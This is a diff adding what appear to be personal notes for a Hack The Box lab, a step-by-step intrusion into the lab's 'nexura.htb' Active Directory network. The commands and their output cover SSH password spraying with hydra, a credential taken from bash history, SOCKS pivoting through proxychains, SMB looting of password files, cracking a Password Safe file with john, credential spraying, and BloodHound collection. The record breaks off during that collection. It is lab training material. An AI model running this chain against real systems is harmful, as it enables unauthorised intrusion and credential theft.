@@ -5371,3 +5371,1170 @@ To access these internal systems, we must first gain a foothold on DMZ01. From t
 
 ## Connect to HTB
 #### What is the NTLM hash of NEXURA\Administrator?
+```bash
+nmap -p- -sV 10.129.234.116 --min-rate 5000
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-28 09:15 -04
+Warning: 10.129.234.116 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.129.234.116
+Host is up (0.14s latency).
+Not shown: 65432 closed tcp ports (conn-refused), 102 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.06 seconds
+
+cd username-anarchy
+nano betty.txt
+> Betty Jayde
+./username-anarchy -i betty.txt > betty_usernames.txt
+
+hydra -L username-anarchy/betty_usernames.txt -p 'Texas123!@#' ssh://10.129.234.116
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-28 09:21:51
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
+[DATA] attacking ssh://10.129.234.116:22/
+[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-28 09:22:14
+
+ssh jbetty@10.129.234.116
+> Texas123!@#
+
+ls -la
+> .bash_history
+
+cat .bash_history
+```
+
+```
+jbetty@DMZ01:~$ cat .bash_history 
+cd ~/projects
+ls
+git status
+git pull origin main
+vim README.md
+cat ~/.bashrc
+sudo apt update
+sudo apt upgrade -y
+clear
+cd ~/Downloads
+ls -lh
+rm -rf old_project/
+mkdir temp
+cd temp
+touch test.py
+nano test.py
+python3 test.py
+pip install requests
+pip install flask
+history
+df -h
+free -m
+top
+htop
+sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
+sudo systemctl status apache2
+sudo systemctl restart apache2
+cd /etc/nginx/sites-available
+ls
+cat default
+sudo nano default
+sudo nginx -t
+sudo systemctl reload nginx
+cd ~
+mkdir scripts
+cd scripts
+vim backup.sh
+chmod +x backup.sh
+./backup.sh
+ssh user@192.168.0.101
+scp file.txt user@192.168.0.101:~/Documents/
+logout
+exit
+cd /var/log
+ls -ltr
+sudo tail -f syslog
+sudo journalctl -xe
+sudo dmesg | less
+ps aux | grep python
+kill -9 13245
+git clone https://github.com/example/repo.git
+cd repo
+ls -a
+code .
+npm install
+npm run dev
+cd ..
+rm -rf repo/
+curl https://ipinfo.io
+ping google.com
+traceroute github.com
+whoami
+groups
+sudo adduser testuser
+sudo usermod -aG sudo testuser
+su - testuser
+exit
+passwd
+uptime
+reboot
+mkdir ~/backup
+rsync -av ~/Documents/ ~/backup/
+du -sh *
+alias ll='ls -alF'
+unalias ll
+history | grep ssh
+find . -name "*.log"
+grep -r "ERROR" /var/log/
+awk '{print $1}' access.log | sort | uniq -c | sort -nr | head
+chmod 755 script.sh
+chown user:user script.sh
+git checkout -b feature/login
+git commit -am "Add login feature"
+git push origin feature/login
+git merge main
+git push
+git log --oneline
+docker ps
+docker images
+docker run -it ubuntu bash
+exit
+cd /tmp
+touch index.html
+echo "<h1>Hello World</h1>" > index.html
+cat index.html
+python3 -m http.server
+curl localhost:8000
+ctrl+c
+tmux
+tmux new -s dev
+tmux ls
+tmux attach -t dev
+tmux kill-session -t dev
+man rsync
+man chown
+crontab -e
+lsblk
+mount
+umount /dev/sdb1
+lsusb
+lscpu
+sudo apt install tree
+tree
+zip -r archive.zip folder/
+unzip archive.zip
+wget http://example.com/file.zip
+tar -xzvf file.tar.gz
+tar -czvf archive.tar.gz folder/
+logout
+
+clear
+ls -l
+clear
+ls -l
+clear
+nano .bash_history
+su
+clear
+ls -l
+nano .bash_history
+echo > .bash_history
+nano .bash_history
+less .bash_history 
+clear
+exit
+pwd
+cat .bash_history 
+exit
+```
+
+```bash
+sshpass -p 'dealer-screwed-gym1' ssh hwilliam@172.16.119.10
+
+Command 'sshpass' not found, but can be installed with:
+
+apt install sshpass
+Please ask your administrator.
+
+# We try to connect using the credentials provided in the text file
+ssh hwilliam@172.16.119.10
+
+ping -c 3 172.16.119.10
+nc -zv 172.16.119.10 22
+
+# But we see we cannot connect to the host, so...
+ip route
+default via 10.129.0.1 dev ens160 
+10.129.0.0/16 dev ens160 proto kernel scope link src 10.129.234.116 
+172.16.119.0/24 dev ens192 proto kernel scope link src 172.16.119.13 
+
+which nmap
+for p in 22 135 139 445 3389 5985 5986; do
+  timeout 1 bash -c "echo > /dev/tcp/172.16.119.10/$p" 2>/dev/null && echo "$p abierto"
+done
+135 abierto
+445 abierto
+3389 abierto
+5985 abierto
+
+ssh -D 1080 jbetty@10.129.234.116
+
+sudo apt update && sudo apt install proxychains -y
+sudo nano /etc/proxychains4.conf
+> socks5 127.0.0.1 1080
+
+source venv/bin/activate
+proxychains nxc smb 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1'
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:135  ...  OK
+SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False)
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 
+
+proxychains nxc smb 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1' --shares
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:135  ...  OK
+SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False)
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 
+SMB         172.16.119.10   445    FILE01           [*] Enumerated shares
+SMB         172.16.119.10   445    FILE01           Share           Permissions            Remark
+SMB         172.16.119.10   445    FILE01           -----           -----------            ------
+SMB         172.16.119.10   445    FILE01           ADMIN$                                 Remote Admin
+SMB         172.16.119.10   445    FILE01           C$                                     Default share
+SMB         172.16.119.10   445    FILE01           HR              READ,WRITE             
+SMB         172.16.119.10   445    FILE01           IPC$            READ                   Remote IPC
+SMB         172.16.119.10   445    FILE01           IT                                     
+SMB         172.16.119.10   445    FILE01           MANAGEMENT                             
+SMB         172.16.119.10   445    FILE01           PRIVATE         READ,WRITE             
+SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE   
+
+proxychains nxc smb 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1' -M spider_plus
+
+proxychains smbclient //172.16.119.10/PRIVATE -U 'nexura.htb\hwilliam%dealer-screwed-gym1'
+
+ls
+cd hwilliam
+ls
+>   .                                   D        0  Tue Apr 29 12:16:58 2025
+  ..                                  D        0  Tue Apr 29 12:16:58 2025
+  Online passwords.xlsx               A     7360  Tue Apr 29 12:16:49 2025
+  Payslips                            D        0  Tue Apr 29 12:12:36 2025
+  Photos                              D        0  Tue Apr 29 12:13:31 2025
+
+get "Online passwords.xlsx"
+
+proxychains smbclient //172.16.119.10/HR -U 'nexura.htb\hwilliam%dealer-screwed-gym1'
+
+ls
+smb: \> ls
+  .                                   D        0  Tue Apr 29 12:08:28 2025
+  ..                                  D        0  Tue Apr 29 12:08:28 2025
+  2024                                D        0  Tue Apr 29 12:08:16 2025
+  2025                                D        0  Tue Apr 29 12:07:24 2025
+  Archive                             D        0  Tue Apr 29 12:10:24 2025
+
+proxychains smbclient //172.16.119.10/TRANSFER -U 'nexura.htb\hwilliam%dealer-screwed-gym1'
+
+smb: \> ls
+  .                                   D        0  Tue Apr 29 11:45:14 2025
+  ..                                  D        0  Tue Apr 29 11:45:14 2025
+
+		5056511 blocks of size 4096. 1580544 blocks available
+
+proxychains smbclient //172.16.119.10/HR -U 'nexura.htb\hwilliam%dealer-screwed-gym1'
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Apr 29 12:08:28 2025
+  ..                                  D        0  Tue Apr 29 12:08:28 2025
+  2024                                D        0  Tue Apr 29 12:08:16 2025
+  2025                                D        0  Tue Apr 29 12:07:24 2025
+  Archive                             D        0  Tue Apr 29 12:10:24 2025
+
+		5056511 blocks of size 4096. 1580528 blocks available
+smb: \> cd Archive
+smb: \Archive\> ls
+  .                                   D        0  Tue Apr 29 12:10:24 2025
+  ..                                  D        0  Tue Apr 29 12:10:24 2025
+  Code of Conduct_OLD.xlsx            A    29380  Tue Apr 29 12:02:27 2025
+  Company presentation OLD.ppt        A   912384  Tue Apr 29 12:02:52 2025
+  Covid 19 Policy.ppt                 A   912384  Tue Apr 29 12:02:52 2025
+  Employee Roster 2023.xlsx           A    13246  Tue Apr 29 12:02:30 2025
+  Employee-Passwords_OLD.plk          A       48  Tue Apr 29 11:13:43 2025
+  Employee-Passwords_OLD.psafe3       A     1080  Tue Apr 29 11:09:57 2025
+  Employee-Passwords_OLD_011.ibak      A      856  Tue Apr 29 11:10:02 2025
+  Employee-Passwords_OLD_012.ibak      A      904  Tue Apr 29 11:10:04 2025
+  Employee-Passwords_OLD_013.ibak      A      952  Tue Apr 29 11:10:07 2025
+  Employee_handbook_2025.doc          A    26069  Tue Apr 29 12:02:39 2025
+  Exit interview Questions.docx       A    34375  Tue Apr 29 12:01:34 2025
+  HR Audit Guide ARCHIVE.docx         A    34375  Tue Apr 29 12:01:34 2025
+  HR Budget Forecast 2026.xlsx        A    32924  Tue Apr 29 12:02:28 2025
+  HR Policies and Procedures.docx      A   120515  Tue Apr 29 12:01:34 2025
+  HRIS System Training.xlsx           A    29380  Tue Apr 29 12:02:27 2025
+  Interview Questions Template.doc      A    32768  Tue Apr 29 12:02:38 2025
+  Manager Onboarding Program.ppt      A   530432  Tue Apr 29 12:02:52 2025
+  Offboarding Checklist.docx          A  1311881  Tue Apr 29 12:01:35 2025
+  Offer Letter Template_OLD.docx      A   120515  Tue Apr 29 12:01:34 2025
+  Password Policy OUTDATED.doc        A    32768  Tue Apr 29 12:02:38 2025
+  PTO Tracking Sheet OLD.ppt          A  1028096  Tue Apr 29 12:02:49 2025
+  Temporary Contractor List_OLD.xlsx      A    32924  Tue Apr 29 12:02:28 2025
+
+get Employee-Passwords_OLD.plk
+get Employee-Passwords_OLD.psafe3
+get Employee-Passwords_OLD_011.ibak
+get Employee-Passwords_OLD_012.ibak
+get Employee-Passwords_OLD_013.ibak
+exit
+
+cd john/run/
+python3 pwsafe2john.py /home/mapacheroja22/Employee-Passwords_OLD.psafe3 > pwsafe.hash
+
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt pwsafe.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (pwsafe, Password Safe [SHA256 512/512 AVX-512 16x])
+Cost 1 (iteration count) is 262144 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+michaeljackson   (Employee-Passwords_OLD)     
+1g 0:00:00:18 DONE (2026-07-28 10:07) 0.05402g/s 885.1p/s 885.1c/s 885.1C/s 123456..christal
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+sudo apt install passwordsafe -y
+pwsafe "Employee-Passwords_OLD.psafe3"
+
+> michaeljackson
+
+David Brittni (bdavid)
+caramel-cigars-reply1
+
+Tom Sandy (stom)
+fails-nibble-disturb4
+
+William Hallam (hwilliam)
+warned-wobble-occur8
+
+nano usuarios.txt
+nano passwords.txt
+
+proxychains nxc smb 172.16.119.7 172.16.119.10 172.16.119.11 -u usuarios.txt -p passwords.txt --continue-on-success
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:445 [proxychains] StrRunning nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False)
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False) (Null Auth:True)
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+SMB         172.16.119.10   445    FILE01           [+] nexura.htb\bdavid:caramel-cigars-reply1 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+SMB         172.16.119.10   445    FILE01           [-] nexura.htb\hwilliam:caramel-cigars-reply1 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+SMB         172.16.119.10   445    FILE01           [-] nexura.htb\stom:caramel-cigars-reply1 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445 <--socket error or timeout!
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+SMB         172.16.119.10   445    FILE01           [-] nexura.htb\hwilliam:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+SMB         172.16.119.10   445    FILE01           [-] nexura.htb\stom:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+SMB         172.16.119.10   445    FILE01           [-] nexura.htb\hwilliam:warned-wobble-occur8 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Strict chain  ...  1RuRunning RunRunnRunning nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
+SMB         172.16.119.10   445    FILE01           [-] nexura.htb\stom:warned-wobble-occur8 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:-- ...  OK
+SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:-- ...  OK
+SMB         172.16.119.11   445    DC01             [-] nexura.htb\hwilliam:caramel-cigars-reply1 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:-- ...  OK
+SMB         172.16.119.11   445    DC01             [-] nexura.htb\stom:caramel-cigars-reply1 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:-- ...  OK
+Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:--<--socket error or timeout!
+SMB         172.16.119.11   445    DC01             [-] nexura.htb\hwilliam:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08 ...  OK
+SMB         172.16.119.11   445    DC01             [-] nexura.htb\stom:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08 ...  OK
+SMB         172.16.119.11   445    DC01             [-] nexura.htb\hwilliam:warned-wobble-occur8 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08 ...  OK
+SMB         172.16.119.11   445    DC01             [-] nexura.htb\stom:warned-wobble-occur8 STATUS_LOGON_FAILURE 
+Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+
+SMB         172.16.119.10   445    FILE01           [+] nexura.htb\bdavid:caramel-cigars-reply1 
+
+SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+
+proxychains nxc ldap 172.16.119.11 -u bdavid -p 'caramel-cigars-reply1' --admin-count
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:636  ...  OK
+LDAP        172.16.119.11   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) (signing:None) (channel binding:No TLS cert) 
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+LDAP        172.16.119.11   389    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+LDAP        172.16.119.11   389    DC01             Administrator
+LDAP        172.16.119.11   389    DC01             krbtgt
+LDAP        172.16.119.11   389    DC01             stom
+❯ proxychains nxc ldap 172.16.119.11 -u bdavid -p 'caramel-cigars-reply1' --groups
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:636  ...  OK
+LDAP        172.16.119.11   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) (signing:None) (channel binding:No TLS cert) 
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+LDAP        172.16.119.11   389    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+LDAP        172.16.119.11   389    DC01             -Group-                                  -Members- -Description-                                               
+LDAP        172.16.119.11   389    DC01             Administrators                           3         Administrators have complete and unrestricted access to the computer/domain
+LDAP        172.16.119.11   389    DC01             Users                                    3         Users are prevented from making accidental or intentional system-wide changes and can run most applications
+LDAP        172.16.119.11   389    DC01             Guests                                   2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+LDAP        172.16.119.11   389    DC01             Print Operators                          0         Members can administer printers installed on domain controllers
+LDAP        172.16.119.11   389    DC01             Backup Operators                         0         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+LDAP        172.16.119.11   389    DC01             Replicator                               0         Supports file replication in a domain
+LDAP        172.16.119.11   389    DC01             Remote Desktop Users                     0         Members in this group are granted the right to logon remotely
+LDAP        172.16.119.11   389    DC01             Network Configuration Operators          0         Members in this group can have some administrative privileges to manage configuration of networking features
+LDAP        172.16.119.11   389    DC01             Performance Monitor Users                0         Members of this group can access performance counter data locally and remotely
+LDAP        172.16.119.11   389    DC01             Performance Log Users                    0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+LDAP        172.16.119.11   389    DC01             Distributed COM Users                    0         Members are allowed to launch, activate and use Distributed COM objects on this machine.
+LDAP        172.16.119.11   389    DC01             IIS_IUSRS                                1         Built-in group used by Internet Information Services.
+LDAP        172.16.119.11   389    DC01             Cryptographic Operators                  0         Members are authorized to perform cryptographic operations.
+LDAP        172.16.119.11   389    DC01             Event Log Readers                        0         Members of this group can read event logs from local machine
+LDAP        172.16.119.11   389    DC01             Certificate Service DCOM Access          0         Members of this group are allowed to connect to Certification Authorities in the enterprise
+LDAP        172.16.119.11   389    DC01             RDS Remote Access Servers                0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
+LDAP        172.16.119.11   389    DC01             RDS Endpoint Servers                     0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
+LDAP        172.16.119.11   389    DC01             RDS Management Servers                   0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
+LDAP        172.16.119.11   389    DC01             Hyper-V Administrators                   0         Members of this group have complete and unrestricted access to all features of Hyper-V.
+LDAP        172.16.119.11   389    DC01             Access Control Assistance Operators      0         Members of this group can remotely query authorization attributes and permissions for resources on this computer.
+LDAP        172.16.119.11   389    DC01             Remote Management Users                  0         Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+LDAP        172.16.119.11   389    DC01             Storage Replica Administrators           0         Members of this group have complete and unrestricted access to all features of Storage Replica.
+LDAP        172.16.119.11   389    DC01             Domain Computers                         0         All workstations and servers joined to the domain
+LDAP        172.16.119.11   389    DC01             Domain Controllers                       0         All domain controllers in the domain
+LDAP        172.16.119.11   389    DC01             Schema Admins                            1         Designated administrators of the schema
+LDAP        172.16.119.11   389    DC01             Enterprise Admins                        1         Designated administrators of the enterprise
+LDAP        172.16.119.11   389    DC01             Cert Publishers                          0         Members of this group are permitted to publish certificates to the directory
+LDAP        172.16.119.11   389    DC01             Domain Admins                            2         Designated administrators of the domain
+LDAP        172.16.119.11   389    DC01             Domain Users                             0         All domain users
+LDAP        172.16.119.11   389    DC01             Domain Guests                            0         All domain guests
+LDAP        172.16.119.11   389    DC01             Group Policy Creator Owners              1         Members in this group can modify group policy for the domain
+LDAP        172.16.119.11   389    DC01             RAS and IAS Servers                      0         Servers in this group can access remote access properties of users
+LDAP        172.16.119.11   389    DC01             Server Operators                         0         Members can administer domain servers
+LDAP        172.16.119.11   389    DC01             Account Operators                        0         Members can administer domain user and group accounts
+LDAP        172.16.119.11   389    DC01             Pre-Windows 2000 Compatible Access       1         A backward compatibility group which allows read access on all users and groups in the domain
+LDAP        172.16.119.11   389    DC01             Incoming Forest Trust Builders           0         Members of this group can create incoming, one-way trusts to this forest
+LDAP        172.16.119.11   389    DC01             Windows Authorization Access Group       1         Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
+LDAP        172.16.119.11   389    DC01             Terminal Server License Servers          0         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
+LDAP        172.16.119.11   389    DC01             Allowed RODC Password Replication Group  0         Members in this group can have their passwords replicated to all read-only domain controllers in the domain
+LDAP        172.16.119.11   389    DC01             Denied RODC Password Replication Group   8         Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
+LDAP        172.16.119.11   389    DC01             Read-only Domain Controllers             0         Members of this group are Read-Only Domain Controllers in the domain
+LDAP        172.16.119.11   389    DC01             Enterprise Read-only Domain Controllers  0         Members of this group are Read-Only Domain Controllers in the enterprise
+LDAP        172.16.119.11   389    DC01             Cloneable Domain Controllers             0         Members of this group that are domain controllers may be cloned.
+LDAP        172.16.119.11   389    DC01             Protected Users                          0         Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
+LDAP        172.16.119.11   389    DC01             Key Admins                               0         Members of this group can perform administrative actions on key objects within the domain.
+LDAP        172.16.119.11   389    DC01             Enterprise Key Admins                    0         Members of this group can perform administrative actions on key objects within the forest.
+LDAP        172.16.119.11   389    DC01             DnsAdmins                                0         DNS Administrators Group
+LDAP        172.16.119.11   389    DC01             DnsUpdateProxy                           0         DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
+LDAP        172.16.119.11   389    DC01             HR                                       1         
+LDAP        172.16.119.11   389    DC01             IT                                       1         
+LDAP        172.16.119.11   389    DC01             MANAGEMENT                               1                                      
+
+proxychains nxc ldap 172.16.119.11 -u bdavid -p 'caramel-cigars-reply1' --bloodhound --collection All --dns-server 172.16.119.11
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
